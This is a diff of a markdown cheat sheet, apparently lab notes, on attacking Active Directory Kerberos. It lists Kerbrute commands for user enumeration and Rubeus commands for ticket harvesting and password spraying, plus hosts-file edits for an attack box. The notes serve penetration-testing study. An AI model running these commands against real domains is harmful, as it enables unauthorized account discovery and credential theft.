@@ -4,12 +4,20 @@
 Use Kerbrute to enumerate valid Active Directory users by abusing Kerberos pre-Authentication
 
 1.  Install Kerbrute ---> https://github.com/ropnop/kerbrute/releases
-2.  For Linux - make sure your attack box ip and DNS domain name are added in the /etc/hosts file or attacks won't work
+2.  For Linux - make sure your attack box ip and DNS domain name are added in your /etc/hosts file or attacks won't work
       echo <ip> <controller> >> /etc/hosts (example: echo 10.10.123.456 CONTROLLER.local >> /etc/hosts)
 3.  Make sure you have a list of usernames available to enumerate through (example: we will use one called User.txt) 
 4.  Run ---> ./Kerbrute --dc CONTROLLER.local -d CONTROLLER.local User.txt
 
 ### Harvesting and Brute-Forcing Tickets with Rubeus  ---> ACCESS AS A USER TO DOMAIN REQUIRED 
+
+1.  Rubeus must be downloaded onto the target machine to work ---> https://github.com/GhostPack/Rubeus
+2.  For Windows - make sure the attack box ip and DNS domain name are added in the target's /etc/hosts file or attacks won't work
+      echo <ip> <controller> >> C:\Windows\System32\drivers\etc\hosts
+3.  Harvesting - Go to directory where Rubeus.exe is on the target machine: 
+      Run ---> Rubeus.exe harvest /interval:30
+4.  Brute-Force/Password Spray - Go to directory where Rubeus.exe is on the target machine:
+      Run ---> Rubeus.exe brute /password:Password1 /noticket
 
 ### Kerberoasting with Rubeus and Impacket  ---> ACCESS AS ANY USER TO DOMAIN REQUIRED
 
